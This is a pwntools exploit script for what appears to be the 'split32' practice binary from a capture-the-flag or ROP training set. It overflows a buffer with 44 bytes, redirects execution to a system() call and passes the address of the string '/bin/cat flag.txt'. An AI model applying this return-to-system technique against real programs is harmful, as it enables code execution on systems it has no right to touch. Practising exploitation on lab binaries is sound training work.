from pwn import *

elf = ELF("./split32")

p = elf.process()
raw_input("DEBUG")

payload = b"A"*44
payload += p32(0x804861a) 
payload += p32(0x804a030) #tham so /bin/cat flag.txt cho ham system

p.sendline(payload)

p.interactive()
